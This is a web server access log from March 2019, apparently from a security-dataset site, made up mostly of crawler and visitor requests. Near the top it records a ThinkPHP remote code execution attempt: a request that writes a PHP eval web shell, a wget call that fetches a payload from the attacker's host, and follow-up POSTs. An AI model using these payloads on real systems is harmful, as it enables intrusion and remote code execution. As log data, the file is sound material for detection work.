54.36.150.180 - - [10/Mar/2019:03:16:00 -0700] "GET /self.logs/error.log.2016-08-04.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
204.44.96.21 - - [10/Mar/2019:03:16:59 -0700] "GET /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo+^<^?php%20@eval($_POST['chenchuan']);?^>^+>xx.php HTTP/1.1" 404 295 "http://www.secrepo.com/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo+^<^?php%20@eval($_POST['chenchuan']);?^>^+>xx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
204.44.96.21 - - [10/Mar/2019:03:16:59 -0700] "GET /index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget+http://204.44.96.21:8080/xxx.php HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget+http://204.44.96.21:8080/xxx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
204.44.96.21 - - [10/Mar/2019:03:17:01 -0700] "POST //thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha HTTP/1.1" 404 295 "http://www.secrepo.com//thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
204.44.96.21 - - [10/Mar/2019:03:17:01 -0700] "POST //thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha HTTP/1.1" 404 294 "http://www.secrepo.com//thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
204.44.96.21 - - [10/Mar/2019:03:17:01 -0700] "POST //xxx.php HTTP/1.1" 404 294 "http://www.secrepo.com//xxx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
113.171.224.176 - - [10/Mar/2019:03:17:25 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
40.77.167.75 - - [10/Mar/2019:03:18:40 -0700] "GET /self.logs/access.log.2017-01-16.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [10/Mar/2019:03:30:59 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
195.154.162.33 - - [10/Mar/2019:03:31:22 -0700] "GET / HTTP/1.1" 200 46413 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0" 
54.36.148.41 - - [10/Mar/2019:03:36:26 -0700] "GET /self.logs/2015/error.log.2015-11-12.gz HTTP/1.1" 200 1255 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
123.125.67.226 - - [10/Mar/2019:03:38:40 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.159 - - [10/Mar/2019:03:38:42 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.71.40 - - [10/Mar/2019:03:38:44 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.174 - - [10/Mar/2019:03:39:09 -0700] "GET / HTTP/1.1" 304 152 "-" "Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
92.38.139.161 - - [10/Mar/2019:03:46:05 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
54.36.150.151 - - [10/Mar/2019:03:47:32 -0700] "GET /self.logs/access.log.2018-06-17.gz HTTP/1.1" 200 21937 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
101.227.139.171 - - [10/Mar/2019:03:49:56 -0700] "GET / HTTP/1.0" 200 46424 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML; like Gecko) Mobile/12F70 MicroMessenger/6.1.5 NetType/WIFI" 
180.208.58.207 - - [10/Mar/2019:03:50:05 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.1010.400 QQBrowser/9.0.2524.400" 
180.208.58.207 - - [10/Mar/2019:03:50:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.1010.400 QQBrowser/9.0.2524.400" 
180.208.58.207 - - [10/Mar/2019:03:50:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.1010.400 QQBrowser/9.0.2524.400" 
180.208.58.210 - - [10/Mar/2019:03:50:07 -0700] "GET /pe_static/zeus.zip HTTP/1.1" 200 2585660 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
180.208.58.87 - - [10/Mar/2019:03:50:18 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
180.208.58.87 - - [10/Mar/2019:03:50:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
180.208.58.87 - - [10/Mar/2019:03:50:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
61.151.178.217 - - [10/Mar/2019:03:50:56 -0700] "GET / HTTP/1.1" 200 46424 "-" "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI ALE-CL00 Build/HuaweiALE-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" 
180.208.58.87 - - [10/Mar/2019:03:51:36 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
142.93.184.135 - - [10/Mar/2019:03:53:53 -0700] "GET / HTTP/1.1" 200 12470 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:03 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:07 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:07 -0700] "GET /data HTTP/1.1" 404 340 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:07 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:07 -0700] "GET / HTTP/1.1" 200 12470 "http://secrepo.com/" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:08 -0700] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:07 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:09 -0700] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20779 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:08 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 3452642 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
142.93.184.135 - - [10/Mar/2019:03:54:08 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 4149586 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
